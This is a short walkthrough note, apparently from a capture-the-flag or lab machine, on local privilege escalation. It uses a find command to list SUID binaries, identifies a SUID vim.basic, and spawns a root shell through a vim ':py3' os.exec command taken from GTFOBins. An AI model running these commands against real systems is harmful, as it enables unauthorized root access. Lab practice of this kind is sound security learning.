#### Typed "find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null" to find SUID binaries and found the following "vim.basic" set as SUID bit: 

![](../Pasted%20Images/Pasted%20image%2020220504005317.png)

#### Found "vim" in GTFOBins site and followed the instructions to run the binary and type colon to enter "enter command mode" and prepend py3 to the command as the machine only has python3 and typed ":py3 import os; os.exec("/bin/sh", "sh", "-pc", "reset; exec sh -p")" and then enter and then when asked "which terminal?" Enter "xterm" and then received a root shell: 

![](../Pasted%20Images/Pasted%20image%2020220504005408.png)

![](../Pasted%20Images/Pasted%20image%2020220504005449.png)

![](../Pasted%20Images/Pasted%20image%2020220504005525.png)

#PrivilegeEscalation #PrivilegeEscalationSUIDVIM #VIM